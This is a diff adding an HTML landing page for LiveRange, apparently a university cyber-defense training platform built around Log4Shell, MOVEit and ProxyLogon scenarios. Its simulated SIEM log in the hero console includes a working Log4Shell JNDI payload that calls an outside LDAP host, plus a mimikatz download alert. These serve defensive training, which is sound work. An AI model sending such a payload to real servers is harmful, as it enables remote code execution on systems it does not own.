@@ -1,0 +1,641 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>LiveRange &mdash; Threat-Intelligence-Driven Cyber Readiness Platform</title>
+  <link rel="stylesheet" href="landing.css?v=6">
+</head>
+<body>
+  <!-- Live Background of Floating Volumetric Rays (Silver / Platinum 60fps Canvas) -->
+  <canvas id="rays-canvas"></canvas>
+  <div class="ambient-wallpaper"></div>
+  <div class="subtle-grid-pattern"></div>
+
+  <!-- Top Sticky Glass Navbar (Black & Silver Liquid Glass) -->
+  <nav class="landing-nav">
+    <div class="nav-brand">
+      <div class="nav-brand-icon">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+          <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
+        </svg>
+      </div>
+      <span>LiveRange</span>
+    </div>
+
+    <div class="nav-links">
+      <a href="#hero" class="nav-link-item">Overview</a>
+      <a href="#bento-pipeline" class="nav-link-item">Architecture</a>
+      <a href="#showcase" class="nav-link-item">Platform</a>
+      <a href="#attack" class="nav-link-item">ATT&CK Matrix</a>
+      <a href="#team" class="nav-link-item">NMIMS Lab</a>
+    </div>
+
+    <div class="nav-actions">
+      <button class="nav-btn-pill" id="btn-toggle-sound" title="Toggle tactical audio">
+        Audio: Off
+      </button>
+      <a href="app.html" class="nav-btn-primary">
+        <span>Launch Platform</span>
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
+      </a>
+    </div>
+  </nav>
+
+  <div class="landing-viewport">
+    <!-- ====================================================================
+         HERO SECTION (AWWWARDS / 21ST.DEV STYLE KINETIC TYPOGRAPHY & CHROME HUD)
+         ==================================================================== -->
+    <header class="hero-section" id="hero">
+      <div class="hero-top-eyebrow-row reveal-on-scroll">
+        <span class="status-live-pill">
+          <span class="ping-dot"></span>
+          <span>LIVE INGESTION ACTIVE // NVD &amp; CISA KEV</span>
+        </span>
+        <span class="hero-coord-tag">19.0760&deg; N &middot; SVKM'S NMIMS MPSTME &middot; AY 2026&ndash;27</span>
+      </div>
+
+      <h1 class="hero-display-title reveal-on-scroll stagger-1">
+        DEFEND AGAINST THREATS<br>
+        <span class="chrome-liquid-text">THAT DIDN'T EXIST YESTERDAY.</span>
+      </h1>
+
+      <p class="hero-lead-text reveal-on-scroll stagger-2">
+        LiveRange converts live vulnerability disclosures from NIST NVD and CISA KEV into deterministic, human-reviewed incident response simulations for SOC Tier 2/3 defense teams.
+      </p>
+
+      <div class="hero-cta-cluster reveal-on-scroll stagger-3">
+        <a href="app.html" class="hero-btn-primary">
+          <span>Launch Operational Platform</span>
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
+        </a>
+
+        <button class="hero-btn-secondary glitch-btn" id="btn-simulate-glitch">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon></svg>
+          <span>Simulate Emerging Breach</span>
+        </button>
+      </div>
+
+      <!-- Hero Centerpiece: Liquid Glass SOC Incident Command Console (Awwwards / Linear / Raycast Style) -->
+      <div class="hero-command-stage reveal-on-scroll stagger-3">
+        <div class="hero-console-frame">
+          <!-- Top Chrome Bar -->
+          <div class="console-top-bar">
+            <div class="console-dots">
+              <span></span><span></span><span></span>
+            </div>
+            <div class="console-title-pill">
+              <span class="live-blink-dot"></span>
+              <span>LIVE THREAT RADAR // NMIMS SECURITY LAB GATEWAY</span>
+            </div>
+            <div class="console-latency-meta mono">
+              <span>LATENCY: 14ms</span>
+              <span class="sep">&middot;</span>
+              <span>FEED: NVD / CISA KEV</span>
+            </div>
+          </div>
+
+          <!-- Interactive Threat Tab Strip -->
+          <div class="console-tab-strip">
+            <button class="console-tab-btn active" data-threat-tab="log4shell">
+              <span class="tab-indicator"></span>
+              <strong>CVE-2021-44228 (Log4Shell)</strong>
+              <span class="tab-badge-crit">CVSS 10.0</span>
+            </button>
+            <button class="console-tab-btn" data-threat-tab="moveit">
+              <span class="tab-indicator"></span>
+              <strong>CVE-2023-34362 (MOVEit)</strong>
+              <span class="tab-badge-crit">CVSS 9.8</span>
+            </button>
+            <button class="console-tab-btn" data-threat-tab="proxylogon">
+              <span class="tab-indicator"></span>
+              <strong>CVE-2021-26855 (ProxyLogon)</strong>
+              <span class="tab-badge-crit">CVSS 9.8</span>
+            </button>
+          </div>
+
+          <!-- 3-Column Live Incident Grid -->
+          <div class="console-incident-grid">
+            <!-- Col 1: Vulnerability Specs -->
+            <div class="console-card-cell" id="hero-cell-specs">
+              <div class="cell-eyebrow">ACTIVE EXPLOIT VECTOR</div>
+              <h3 class="cell-threat-title" id="hero-threat-name">Apache Log4j JNDI RCE</h3>
+              <div class="cell-meta-chips" id="hero-threat-chips">
+                <span class="chip-mono">T1190 Exploit Public-Facing</span>
+                <span class="chip-mono">Zero-Day Wild</span>
+                <span class="chip-mono">Remote Code Exec</span>
+              </div>
+              <p class="cell-desc-text" id="hero-threat-desc">
+                Insecure JNDI lookup parsing allows unauthenticated remote attackers to execute arbitrary Java bytecode via nested <code>${jndi:ldap://}</code> payloads in HTTP header telemetry.
+              </p>
+              <div class="cell-review-badge">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
+                <span>Curated & Validated &middot; Prof. Pintu Shah Review Gate</span>
+              </div>
+            </div>
+
+            <!-- Col 2: Correlated SIEM Telemetry Logs -->
+            <div class="console-card-cell term-cell">
+              <div class="cell-eyebrow">SYNTHESIZED SIEM CORRELATION STREAM</div>
+              <div class="hero-siem-log-stream mono" id="hero-siem-logs">
+                <div class="log-row"><span class="log-time">14:02:11.204</span> <span class="log-tag">[WAF-01]</span> INBOUND URI /login User-Agent:${jndi:ldap://45.142.214.8/a}</div>
+                <div class="log-row"><span class="log-time">14:02:11.218</span> <span class="log-crit">[RULE-CRIT]</span> SIG-LOG4J-01 Matched outbound TCP/389 connect attempt</div>
+                <div class="log-row"><span class="log-time">14:02:11.450</span> <span class="log-warn">[EDR-03]</span> Spawning /bin/sh child from java.exe (PID: 4182)</div>
+                <div class="log-row"><span class="log-time">14:02:11.890</span> <span class="log-crit">[SURICATA]</span> Suspicious ELF payload download detected (mimikatz.x86)</div>
+                <div class="log-row"><span class="log-time">14:02:12.110</span> <span class="log-tag">[CORRELATOR]</span> Auto-Incident #LVR-44228 opened &middot; High Confidence</div>
+              </div>
+            </div>
+
+            <!-- Col 3: Real-Time Readiness Metrics & Range Action -->
+            <div class="console-card-cell" id="hero-cell-metrics">
+              <div class="cell-eyebrow">TEAM READINESS BENCHMARK</div>
+              <div class="hero-stat-duo">
+                <div class="hero-stat-box">
+                  <span class="stat-num mono" id="hero-stat-mttd">04.2m</span>
+                  <span class="stat-lbl">Mean Time to Detect (MTTD)</span>
+                </div>
+                <div class="hero-stat-box">
+                  <span class="stat-num mono" id="hero-stat-accuracy">94%</span>
+                  <span class="stat-lbl">Triage Decision Accuracy</span>
+                </div>
+              </div>
+              <div class="readiness-progress-strip">
+                <div class="prog-labels">
+                  <span>MITRE Coverage Alignment</span>
+                  <strong class="mono" id="hero-stat-coverage">84%</strong>
+                </div>
+                <div class="prog-bar-track">
+                  <div class="prog-bar-fill" id="hero-stat-bar" style="width: 84%"></div>
+                </div>
+              </div>
+              <a href="app.html#scenarios" class="hero-launch-lab-btn">
+                <span>Launch Range Emulation &rarr;</span>
+              </a>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Mechanical Split-Flap Intel Ticker (Style 2 - Image 1 #13) -->
+      <div class="split-flap-container reveal-on-scroll" id="glitch-target-card">
+        <div class="split-flap-header">
+          <span class="live-pulse"></span>
+          <span>INTEL_STREAM</span>
+        </div>
+
+        <div class="split-flap-board" id="split-flap-board">
+          <!-- Split flap tiles generated dynamically -->
+        </div>
+
+        <div class="split-flap-meta">
+          NVD &middot; CISA KEV &middot; 60FPS
+        </div>
+      </div>
+    </header>
+
+    <!-- ====================================================================
+         AWWWARDS INFINITE CONTINUOUS MARQUEE BAND
+         ==================================================================== -->
+    <div class="infinite-ticker-band">
+      <div class="ticker-track">
+        <div class="ticker-item"><span>CVE-2021-44228 LOG4SHELL</span><span class="dot">&bull;</span></div>
+        <div class="ticker-item"><span>T1190 PUBLIC APP EXPLOIT</span><span class="dot">&bull;</span></div>
+        <div class="ticker-item"><span>CVE-2023-34362 MOVEIT TRANSFER</span><span class="dot">&bull;</span></div>
+        <div class="ticker-item"><span>CL0P RANSOMWARE SYNDICATE</span><span class="dot">&bull;</span></div>
+        <div class="ticker-item"><span>T1505.003 PROXYLOGON WEBSHELL</span><span class="dot">&bull;</span></div>
+        <div class="ticker-item"><span>T1059.001 SUSPICIOUS POWERSHELL</span><span class="dot">&bull;</span></div>
+        <div class="ticker-item"><span>NIST SP 800-61R2 INCIDENT RESPONSE</span><span class="dot">&bull;</span></div>
+        <div class="ticker-item"><span>AIC-NMIMS PRE-INCUBATION PILOT</span><span class="dot">&bull;</span></div>
+        <div class="ticker-item"><span>&inr;2,999/ANALYST/MO MSSP BEACHHEAD</span><span class="dot">&bull;</span></div>
+        <!-- Duplicated for seamless infinite loop -->
+        <div class="ticker-item"><span>CVE-2021-44228 LOG4SHELL</span><span class="dot">&bull;</span></div>
+        <div class="ticker-item"><span>T1190 PUBLIC APP EXPLOIT</span><span class="dot">&bull;</span></div>
+        <div class="ticker-item"><span>CVE-2023-34362 MOVEIT TRANSFER</span><span class="dot">&bull;</span></div>
+        <div class="ticker-item"><span>CL0P RANSOMWARE SYNDICATE</span><span class="dot">&bull;</span></div>
+        <div class="ticker-item"><span>T1505.003 PROXYLOGON WEBSHELL</span><span class="dot">&bull;</span></div>
+        <div class="ticker-item"><span>T1059.001 SUSPICIOUS POWERSHELL</span><span class="dot">&bull;</span></div>
+        <div class="ticker-item"><span>NIST SP 800-61R2 INCIDENT RESPONSE</span><span class="dot">&bull;</span></div>
+        <div class="ticker-item"><span>AIC-NMIMS PRE-INCUBATION PILOT</span><span class="dot">&bull;</span></div>
+        <div class="ticker-item"><span>&inr;2,999/ANALYST/MO MSSP BEACHHEAD</span><span class="dot">&bull;</span></div>
+      </div>
+    </div>
+
+    <!-- ====================================================================
+         21ST.DEV ASYMMETRIC BENTO GRID SECTION
+         ==================================================================== -->
+    <section class="section-wrap" id="bento-pipeline">
+      <div class="reveal-on-scroll">
+        <span class="section-eyebrow">CONTINUOUS THREAT-TO-TRAINING ARCHITECTURE</span>
+        <h2 class="section-title">Designed for Realistic Cyber Defense.</h2>
+        <p class="section-desc">
+          LiveRange bridges live CVE feeds to hands-on incident investigation through a mandatory human-review gate supervised by academic mentors.
+        </p>
+      </div>
+
+      <div class="bento-grid">
+        <!-- Bento Card 1 (Span 8): 6-Stage Blueprint Pipeline (Report Fig. 2) -->
+        <div class="spotlight-card bento-col-8 reveal-on-scroll">
+          <div class="bento-inner-pad">
+            <div class="bento-card-header">
+              <span class="bento-tag">REPORT FIGURE 2 // PIPELINE ARCHITECTURE</span>
+              <h3 class="bento-card-title">The 6-Stage Threat-to-Training Pipeline</h3>
+              <p class="bento-card-desc">Click any stage below to inspect automated ingestion, MITRE mapping, and supervisor review gates.</p>
+            </div>
+
+            <div class="pipeline-node-grid">
+              <div class="pipeline-mini-node active" data-step="0">
+                <span class="p-step-num">01. DISCOVER</span>
+                <strong class="p-step-title">Public Threat Intel</strong>
+                <p class="p-step-desc">NVD &amp; CISA KEV feeds.</p>
+              </div>
+
+              <div class="pipeline-mini-node" data-step="1">
+                <span class="p-step-num">02. INTERPRET</span>
+                <strong class="p-step-title">ATT&CK Mapping</strong>
+                <p class="p-step-desc">TTP classification.</p>
+              </div>
+
+              <div class="pipeline-mini-node" data-step="2">
+                <span class="p-step-num">03. PREPARE</span>
+                <strong class="p-step-title">Scenario Compiler</strong>
+                <p class="p-step-desc">SIEM logs &amp; 3-step labs.</p>
+              </div>
+
+              <div class="pipeline-mini-node gate-highlight" data-step="3">
+                <span class="p-step-num" style="color:#fff">04. REVIEW GATE ★</span>
+                <strong class="p-step-title">Prof. Pintu Shah</strong>
+                <p class="p-step-desc">Mandatory sign-off.</p>
+              </div>
+
+              <div class="pipeline-mini-node" data-step="4">
+                <span class="p-step-num">05. INVESTIGATE</span>
+                <strong class="p-step-title">SOC Cyber Range</strong>
+                <p class="p-step-desc">Interactive telemetry lab.</p>
+              </div>
+
+              <div class="pipeline-mini-node" data-step="5">
+                <span class="p-step-num">06. MEASURE</span>
+                <strong class="p-step-title">Readiness Scoring</strong>
+                <p class="p-step-desc">MTTD &amp; NIST evaluation.</p>
+              </div>
+            </div>
+
+            <!-- Dynamic Inspector Console -->
+            <div class="bento-inspector-console" id="bento-inspector-console">
+              <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;border-bottom:1px solid var(--silver-border);padding-bottom:6px">
+                <strong style="color:#fff;font-size:12.5px">01. DISCOVER // Public Threat Intelligence Feeds</strong>
+                <span style="font-size:10px;color:var(--silver-dark)">STAGE_01</span>
+              </div>
+              <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:8px">
+                <div>
+                  <div style="color:var(--silver-dark);font-size:9.5px">INPUT TELEMETRY:</div>
+                  <div style="color:var(--silver-mid)">NIST NVD 2.0 API, CISA KEV (Known Exploited Vulnerabilities), RSS Advisories</div>
+                </div>
+                <div>
+                  <div style="color:var(--silver-dark);font-size:9.5px">AUTOMATED ENGINE:</div>
+                  <div style="color:var(--silver-mid)">Continuous crawler ingesting CVE disclosures, CVSS v3.1 metrics, and affected CPEs.</div>
+                </div>
+              </div>
+              <div style="padding-top:6px;border-top:1px solid var(--silver-border)">
+                <span style="color:var(--silver-dark);font-size:9.5px">STAGE OUTPUT:</span>
+                <span style="color:#fff;font-weight:600">Normalized JSON vulnerability schema stored in telemetry staging database.</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Bento Card 2 (Span 4): Playable Mini-Lab Console -->
+        <div class="spotlight-card bento-col-4 reveal-on-scroll stagger-1" id="mini-lab">
+          <div class="bento-inner-pad">
+            <div class="bento-card-header">
+              <span class="bento-tag">STEP 1: INVESTIGATE // LOG CORRELATION</span>
+              <h3 class="bento-card-title">Test Your Triage</h3>
+              <p class="bento-card-desc">Correlate WAF &amp; EDR logs to find the anomalous egress host:</p>
+            </div>
+
+            <div class="mini-lab-bento-content">
+              <div class="terminal-stream-box">
+                <div>09:41:02 [WAF-01]  <span class="crit">[ALERT]</span> HTTP: '${jndi:ldap...}'</div>
+                <div>09:41:06 [EDR-03]  <span class="crit">[WARN]</span>  java.exe egress to :389</div>
+                <div>09:41:07 [HOST-03] host=web-app-03  log4j-core-2.14.1</div>
+                <div>09:41:13 [AUTH-01] backup-svc login on backup-01</div>
+              </div>
+
+              <div class="mini-lab-choice-list">
+                <button class="lab-choice-btn" data-choice="0">
+                  <strong>web-app-03:</strong> Outbound LDAP query detected.
+                </button>
+                <button class="lab-choice-btn" data-choice="1">
+                  <strong>backup-01:</strong> Routine scheduled maintenance.
+                </button>
+              </div>
+
+              <button class="nav-btn-primary" id="btn-submit-mini-lab" style="justify-content:center;padding:10px">
+                Submit Decision →
+              </button>
+
+              <div id="mini-lab-feedback" style="font-size:11.5px"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ====================================================================
+         3D PERSPECTIVE LIQUID GLASS DASHBOARD SHOWCASE SECTION
+         ==================================================================== -->
+    <section class="section-wrap" id="showcase">
+      <div style="text-align:center;margin-bottom:44px" class="reveal-on-scroll">
+        <span class="section-eyebrow">SOC TIER 2/3 OPERATIONS INTERFACE</span>
+        <h2 class="section-title">An Obsidian &amp; Silver Unified Control Plane.</h2>
+        <p class="section-desc" style="margin:0 auto">
+          Engineered with an authentic Apple-style liquid glass finish, multi-column threat feeds, and NIST SP 800-61 response playbooks.
+        </p>
+      </div>
+
+      <div class="dashboard-showcase-container reveal-on-scroll stagger-1">
+        <div class="dashboard-showcase-glass">
+          <div class="showcase-chrome-bar">
+            <div class="showcase-window-dots">
+              <span></span><span></span><span></span>
+            </div>
+            <div class="showcase-url-pill">
+              https://liverange.soc.nmims.edu/overview
+            </div>
+            <div style="font-family:var(--font-mono);font-size:10px;color:var(--silver-dark)">
+              STABLE_BUILD_V2.0
+            </div>
+          </div>
+
+          <div class="showcase-body-grid">
+            <!-- Sidebar Preview Mock -->
+            <div class="showcase-sidebar">
+              <div style="font-size:11.5px;font-weight:700;color:#fff;display:flex;align-items:center;gap:6px">
+                <span style="width:14px;height:14px;background:#242838;border-radius:3px;display:inline-block"></span>
+                LiveRange
+              </div>
+              <div style="font-size:9.5px;color:var(--silver-dark);margin-top:12px;text-transform:uppercase;font-family:var(--font-mono)">Workspace</div>
+              <div style="font-size:11.5px;color:#fff;font-weight:500;padding:5px 8px;background:rgba(255,255,255,0.08);border-radius:4px">Overview (G O)</div>
+              <div style="font-size:11.5px;color:var(--silver-muted);padding:5px 8px">Threat Feed (G I)</div>
+              <div style="font-size:11.5px;color:var(--silver-muted);padding:5px 8px">Scenarios (G S)</div>
+              <div style="font-size:11.5px;color:var(--silver-muted);padding:5px 8px">Range Lab (G R)</div>
+              <div style="font-size:11.5px;color:var(--silver-muted);padding:5px 8px">Readiness (G A)</div>
+              <div style="margin-top:auto;font-size:10px;color:var(--silver-dark);border-top:1px solid var(--silver-border);padding-top:10px">
+                Prof. Pintu Shah &middot; NMIMS
+              </div>
+            </div>
+
+            <!-- Main Body Preview Mock -->
+            <div class="showcase-main-body">
+              <div class="showcase-metrics-row">
+                <div class="showcase-stat-card">
+                  <label>Threats Ingested</label>
+                  <strong>06</strong>
+                </div>
+                <div class="showcase-stat-card">
+                  <label>Reviewed Packs</label>
+                  <strong>03</strong>
+                </div>
+                <div class="showcase-stat-card">
+                  <label>Priority Triage</label>
+                  <strong>01</strong>
+                </div>
+                <div class="showcase-stat-card">
+                  <label>Readiness Score</label>
+                  <strong>78%</strong>
+                </div>
+              </div>
+
+              <div class="showcase-table-box">
+                <div class="showcase-table-row header">
+                  <span>THREAT / CVE</span>
+                  <span>TARGET TECHNOLOGY</span>
+                  <span>MITRE TECHNIQUE</span>
+                  <span>CVSS SCORE</span>
+                  <span>STATUS</span>
+                </div>
+                <div class="showcase-table-row">
+                  <strong style="color:#fff">Log4Shell (CVE-2021-44228)</strong>
+                  <span style="color:var(--silver-muted)">Apache Log4j Core 2.14.1</span>
+                  <span class="mono" style="color:var(--silver-light)">T1190</span>
+                  <span style="color:#fff;font-weight:600">CRITICAL 10.0</span>
+                  <span style="font-size:10px;color:#cbd5e1;background:rgba(255,255,255,0.08);padding:2px 6px;border-radius:4px">TRIAGE LAB</span>
+                </div>
+                <div class="showcase-table-row">
+                  <strong style="color:#fff">MOVEit Transfer (CVE-2023-34362)</strong>
+                  <span style="color:var(--silver-muted)">MOVEit Web Service</span>
+                  <span class="mono" style="color:var(--silver-light)">T1190</span>
+                  <span style="color:#fff;font-weight:600">CRITICAL 9.8</span>
+                  <span style="font-size:10px;color:#cbd5e1;background:rgba(255,255,255,0.08);padding:2px 6px;border-radius:4px">REVIEWED</span>
+                </div>
+                <div class="showcase-table-row">
+                  <strong style="color:#fff">ProxyLogon (CVE-2021-26855)</strong>
+                  <span style="color:var(--silver-muted)">Microsoft Exchange Server</span>
+                  <span class="mono" style="color:var(--silver-light)">T1505.003</span>
+                  <span style="color:#fff;font-weight:600">CRITICAL 9.8</span>
+                  <span style="font-size:10px;color:#cbd5e1;background:rgba(255,255,255,0.08);padding:2px 6px;border-radius:4px">REVIEWED</span>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Hover Overlay Curtain -->
+          <div class="showcase-overlay-curtain">
+            <h3 style="font-size:24px;color:#fff;font-weight:700;margin-bottom:8px">Experience LiveRange in Your Browser</h3>
+            <p style="font-size:13px;color:var(--silver-muted);margin-bottom:22px">Step into the full operational dashboard with live threat feeds, SIEM logs, and lab evaluations.</p>
+            <a href="app.html" class="hero-btn-primary">
+              <span>Enter Operational Platform →</span>
+            </a>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ====================================================================
+         MITRE ATT&CK HEATMAP & COVERAGE MATRIX (REPORT FIG. 7)
+         ==================================================================== -->
+    <section class="section-wrap" id="attack">
+      <div class="reveal-on-scroll">
+        <span class="section-eyebrow">REPORT FIGURE 7 // COVERAGE MATRIX</span>
+        <h2 class="section-title">Quantified Readiness Across 8 ATT&CK Tactics.</h2>
+        <p class="section-desc">
+          LiveRange measures team response accuracy and Mean Time to Detect (MTTD) across real-world adversarial intrusion chains.
+        </p>
+      </div>
+
+      <div class="attack-heatmap-grid reveal-on-scroll stagger-1">
+        <div class="attack-tactic-box">
+          <div class="tactic-pct-num">62%</div>
+          <div class="tactic-title-str">Initial Access</div>
+          <span class="tactic-tech-id">T1190 Public Exploit</span>
+          <div class="tactic-bar-wrap"><div class="tactic-bar-gauge" style="width:62%"></div></div>
+        </div>
+
+        <div class="attack-tactic-box">
+          <div class="tactic-pct-num">84%</div>
+          <div class="tactic-title-str">Execution</div>
+          <span class="tactic-tech-id">T1059 Command Script</span>
+          <div class="tactic-bar-wrap"><div class="tactic-bar-gauge" style="width:84%"></div></div>
+        </div>
+
+        <div class="attack-tactic-box">
+          <div class="tactic-pct-num">71%</div>
+          <div class="tactic-title-str">Persistence</div>
+          <span class="tactic-tech-id">T1505.003 Web Shell</span>
+          <div class="tactic-bar-wrap"><div class="tactic-bar-gauge" style="width:71%"></div></div>
+        </div>
+
+        <div class="attack-tactic-box">
+          <div class="tactic-pct-num">45%</div>
+          <div class="tactic-title-str">Credential Access</div>
+          <span class="tactic-tech-id">T1110 Brute Force</span>
+          <div class="tactic-bar-wrap"><div class="tactic-bar-gauge" style="width:45%"></div></div>
+        </div>
+
+        <div class="attack-tactic-box">
+          <div class="tactic-pct-num">80%</div>
+          <div class="tactic-title-str">Discovery</div>
+          <span class="tactic-tech-id">T1087 Account Discovery</span>
+          <div class="tactic-bar-wrap"><div class="tactic-bar-gauge" style="width:80%"></div></div>
+        </div>
+
+        <div class="attack-tactic-box">
+          <div class="tactic-pct-num">54%</div>
+          <div class="tactic-title-str">Lateral Movement</div>
+          <span class="tactic-tech-id">T1021 Remote Services</span>
+          <div class="tactic-bar-wrap"><div class="tactic-bar-gauge" style="width:54%"></div></div>
+        </div>
+
+        <div class="attack-tactic-box">
+          <div class="tactic-pct-num">73%</div>
+          <div class="tactic-title-str">Collection</div>
+          <span class="tactic-tech-id">T1005 Data from Host</span>
+          <div class="tactic-bar-wrap"><div class="tactic-bar-gauge" style="width:73%"></div></div>
+        </div>
+
+        <div class="attack-tactic-box">
+          <div class="tactic-pct-num">39%</div>
+          <div class="tactic-title-str">Exfiltration</div>
+          <span class="tactic-tech-id">T1041 Exfiltration C2</span>
+          <div class="tactic-bar-wrap"><div class="tactic-bar-gauge" style="width:39%"></div></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ====================================================================
+         ACADEMIC CREDENTIALS & AIC-NMIMS INCUBATION
+         ==================================================================== -->
+    <section class="section-wrap" id="team">
+      <div class="academic-dossier-wrap reveal-on-scroll">
+        <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:18px">
+          <div>
+            <span class="section-eyebrow" style="margin-bottom:4px">ENTREPRENEURSHIP VERTICAL &middot; AY 2026&ndash;27</span>
+            <h2 style="font-size:26px;color:#fff;font-weight:700">Mukesh Patel School of Technology Management &amp; Engineering</h2>
+            <p style="font-size:13px;color:var(--silver-muted)">SVKM's Narsee Monjee Institute of Management Studies (NMIMS), Mumbai &middot; Department of IT</p>
+          </div>
+
+          <div style="text-align:right">
+            <span style="font-size:11px;color:var(--silver-dark);display:block">SUPERVISOR</span>
+            <strong style="font-size:15px;color:#fff">Prof. Pintu Shah</strong>
+            <small style="color:var(--silver-muted);display:block">Department of Information Technology</small>
+          </div>
+        </div>
+
+        <div class="team-grid-5">
+          <div class="team-member-card">
+            <div class="team-avatar-box">SS</div>
+            <strong>Sahil Shah</strong>
+            <small>Market &amp; Competitor Validation, BMC</small>
+          </div>
+
+          <div class="team-member-card">
+            <div class="team-avatar-box">SJ</div>
+            <strong>Shripad Jadhav</strong>
+            <small>Threat Intel &amp; Scenario Design, ATT&CK</small>
+          </div>
+
+          <div class="team-member-card">
+            <div class="team-avatar-box">JV</div>
+            <strong>Jash Vakharia</strong>
+            <small>Prototype Engineering: UI, Logic, Scoring</small>
+          </div>
+
+          <div class="team-member-card">
+            <div class="team-avatar-box">DL</div>
+            <strong>Debayan Lahiry</strong>
+            <small>Team Lead, Problem Framing, Strategy</small>
+          </div>
+
+          <div class="team-member-card">
+            <div class="team-avatar-box">SR</div>
+            <strong>Samanyu Rai</strong>
+            <small>GTM &amp; AIC-NMIMS Incubation</small>
+          </div>
+        </div>
+
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px;padding-top:24px;border-top:1px solid var(--silver-border)">
+          <div>
+            <strong style="color:#fff;font-size:13px;display:block;margin-bottom:4px">Commercial Hypothesis (BMC)</strong>
+            <p style="font-size:12px;color:var(--silver-muted);line-height:1.55">
+              Beachhead: Mid-sized Managed Security Service Providers (10&ndash;50 SOC analysts). Value proposition: measurable Mean Time to Detect (MTTD) reduction and ~&#8377;2,999/analyst/month subscription.
+            </p>
+          </div>
+          <div>
+            <strong style="color:#fff;font-size:13px;display:block;margin-bottom:4px">Incubation Engagement</strong>
+            <p style="font-size:12px;color:var(--silver-muted);line-height:1.55">
+              Targeting pilot deployment and pre-incubation grants under Atal Incubation Centre NMIMS (AIC-NMIMS) and the DST NIDHI-TBI ecosystem.
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="landing-footer">
+      <div>
+        <strong>LiveRange</strong> &mdash; Threat-Intelligence-Driven Cyber Readiness Platform.<br>
+        Department of Information Technology, MPSTME, SVKM's NMIMS.
+      </div>
+      <div style="display:flex;gap:20px">
+        <a href="#hero">Back to top &uarr;</a>
+        <a href="app.html">Launch Full Platform &rarr;</a>
+      </div>
+    </footer>
+  </div>
+
+  <!-- Apple macOS Floating Dock -->
+  <nav class="floating-macos-dock">
+    <a href="#hero" class="dock-pill-btn">
+      <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path></svg>
+      <span>Home</span>
+    </a>
+
+    <a href="#bento-pipeline" class="dock-pill-btn">
+      <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline></svg>
+      <span>Pipeline</span>
+    </a>
+
+    <a href="#showcase" class="dock-pill-btn">
+      <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><line x1="3" y1="9" x2="21" y2="9"></line><line x1="9" y1="21" x2="9" y2="9"></line></svg>
+      <span>Showcase</span>
+    </a>
+
+    <a href="#mini-lab" class="dock-pill-btn">
+      <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
+      <span>Mini-Lab</span>
+    </a>
+
+    <a href="#attack" class="dock-pill-btn">
+      <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="20" x2="18" y2="10"></line><line x1="12" y1="20" x2="12" y2="4"></line><line x1="6" y1="20" x2="6" y2="14"></line></svg>
+      <span>ATT&CK</span>
+    </a>
+
+    <a href="app.html" class="dock-pill-btn primary-launch">
+      <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>
+      <span>Launch App</span>
+    </a>
+  </nav>
+
+  <script src="landing.js?v=6"></script>
+</body>
+</html>
